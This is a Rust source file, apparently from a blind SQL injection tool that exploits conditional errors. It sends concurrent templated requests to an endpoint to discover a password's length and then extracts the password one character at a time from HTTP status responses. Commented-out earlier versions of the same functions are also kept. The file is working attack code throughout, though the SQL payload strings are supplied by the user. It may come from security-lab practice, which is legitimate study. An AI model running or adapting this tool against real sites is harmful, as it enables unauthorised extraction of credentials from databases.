use crate::utilities::*;
use anyhow::anyhow;
use futures::stream::{self, StreamExt};
use log::{error, info};
use my_request::*;
use tokio::pin;

///
/// combines the find length and find password functions to use for Blind SQLi with conditional
/// errors.
///
pub async fn blind_conditional(
    concurrency: usize,
    client: &MyClient,
    endpoint: &str,
    payload_length: Option<&str>,
    payload_password: Option<&str>,
) -> anyhow::Result<String> {
    let length = find_length_conditional(concurrency, client, endpoint, payload_length).await;
    let length = match length {
        Some(length) => {
            info!("Fount the length, its {length}");
            length
        }
        None => {
            log::error!("Couldnt find the Length");
            println!("Exiting..");
            std::process::exit(1);
        }
    };

    find_password_conditional(concurrency, client, endpoint, payload_password, length).await
}

/// You can find the length of a password using conditional errors.
///
/// You need to provide:
/// - The number of concurrent requests you want
/// - The MyClient struct
/// - A url path/endpoint
/// - An Option for a payload in the headers (None for no headers and use the endpoint instead)
///
/// NOTE: We improved the code to stop early without doing hacky error tricks!!
///
async fn find_length_conditional(
    concurrency: usize,
    client: &MyClient,
    endpoint: &str,
    payload: Option<&str>,
) -> Option<usize> {
    let x = stream::iter(1..=50)
        .map(|i| async move {
            let value1 = i.to_string();
            let (endpoint, payload) = extract_replace_data(endpoint, payload, "{value1}", &value1);
            let res = client.get_request(&endpoint, payload.as_deref()).await;

            match res {
                Ok(res) => {
                    if res.status().is_success() {
                        println!("The length is {}", i);
                        Some(i)
                    } else {
                        None
                    }
                }
                Err(_) => None,
            }
        })
        .buffer_unordered(concurrency)
        .filter_map(|result| async move { result });

    pin!(x);

    x.next().await
}

//async fn find_length(
//    concurrency: usize,
//    client: &MyClient,
//    endpoint: &str,
//    payload: Option<&str>,
//) -> Option<u8> {
//    let (tx, mut rx) = mpsc::channel(concurrency);
//    let _x = stream::iter(1..=50)
//        .map(Ok)
//        .try_for_each_concurrent(concurrency, |i| {
//            let tx_clone = tx.clone();
//            async move {
//                let value1 = i.to_string();
//                let (endpoint, payload) = match payload {
//                    Some(payload) => (
//                        endpoint.to_string(),
//                        Some(payload.replace("{value1}", &value1)),
//                    ),
//                    None => (endpoint.replace("{value1}", &value1), None),
//                };
//                let res = client
//                    .get_request(&endpoint, payload.as_deref())
//                    .await
//                    .unwrap();
//                if res.status().is_success() {
//                    println!("The length is {}", i);
//                    let _ = tx_clone.send(i).await;
//                    return Err(());
//                }
//                Ok(())
//            }
//        })
//        .await;
//    rx.recv().await
//}

/// You can find the password of a given length using conditional errors.
///
/// You need to provide:
/// - The number of concurrent requests you want
/// - The MyClient struct
/// - A url path/endpoint
/// - An Option for a payload in the headers (None for no headers and use the endpoint instead)
/// - The password length
///
async fn find_password_conditional(
    concurrency: usize,
    client: &MyClient,
    endpoint: &str,
    payload: Option<&str>,
    length: usize,
) -> anyhow::Result<String> {
    let alphanumeric = "qwertyuioplkjhgfdsazxcvbnm1234567890";
    let mut password = String::with_capacity(length);
    for i in 1..=length {
        let value1 = i.to_string();
        let (endpoint, payload) = extract_replace_data(endpoint, payload, "{value1}", &value1);
        let endpoint = &endpoint;
        let characters: Vec<char> = stream::iter(alphanumeric.chars())
            .map(|c| {
                let payload = payload.clone();
                async move {
                    let value2 = c.to_string();
                    let (endpoint, payload) =
                        extract_replace_data(endpoint, payload.as_deref(), "{value2}", &value2);

                    let res = client.get_request(&endpoint, payload.as_deref()).await;
                    match res {
                        Ok(res) => {
                            if res.status().is_success() {
                                info!("the {} letter of the password is {}", i, c);
                                Some(c)
                            } else {
                                None
                            }
                        }
                        Err(e) => {
                            error!(
                            "Error making the request for letter '{c}' for the {i} iteration. {e}"
                        );
                            None
                        }
                    }
                }
            })
            .buffer_unordered(concurrency)
            .filter_map(|result| async move { result })
            .collect()
            .await;

        if characters.is_empty() || characters.len() > 1 {
            return Err(anyhow!("Couldnt find a password"));
        } else {
            password.push(characters[0])
        }
    }
    Ok(password)
}

//async fn find_password_conditional(
//    concurrency: usize,
//    client: &MyClient,
//    endpoint: &str,
//    payload: Option<&str>,
//    length: u8,
//) -> anyhow::Result<String> {
//    let alphanumeric = "qwertyuioplkjhgfdsazxcvbnm1234567890";
//    let mut password = String::new();
//    for i in 1..=length {
//        let value1 = i.to_string();
//        let (endpoint, payload) = match payload {
//            Some(payload) => (
//                endpoint.to_string(),
//                Some(payload.replace("{value1}", &value1)),
//            ),
//            None => (endpoint.replace("{value1}", &value1), None),
//        };
//        let endpoint = &endpoint;
//        //let payload = payload.replace("{value1}", &value1);
//        let characters: Vec<char> = stream::iter(alphanumeric.chars())
//            .map(|c| {
//                let payload = payload.clone();
//                async move {
//                    let value2 = c.to_string();
//                    let (endpoint, payload) = match payload {
//                        Some(payload) => (
//                            endpoint.to_string(),
//                            Some(payload.replace("{value2}", &value2)),
//                        ),
//                        None => (endpoint.replace("{value2}", &value2), None),
//                    };
//                    //let payload = payload.replace("{value2}", &value2);
//
//                    (c, client.get_request(&endpoint, payload.as_deref()).await)
//                }
//            })
//            .buffer_unordered(concurrency)
//            .filter_map(|(c, res)| async move {
//                let res = match res {
//                    Ok(res) => res,
//                    Err(e) => {
//                        error!(
//                            "Error making the request for letter '{c}' for the {i} iteration. {e}"
//                        );
//                        return None;
//                    }
//                };
//                if res.status().is_success() {
//                    info!("the {} letter of the password is {}", i, c);
//                    Some(c)
//                } else {
//                    None
//                }
//            })
//            .collect()
//            .await;
//        if characters.is_empty() || characters.len() > 1 {
//            return Err(anyhow!("Couldnt find a password"));
//        } else {
//            password.push(characters[0])
//        }
//    }
//    Ok(password)
//}
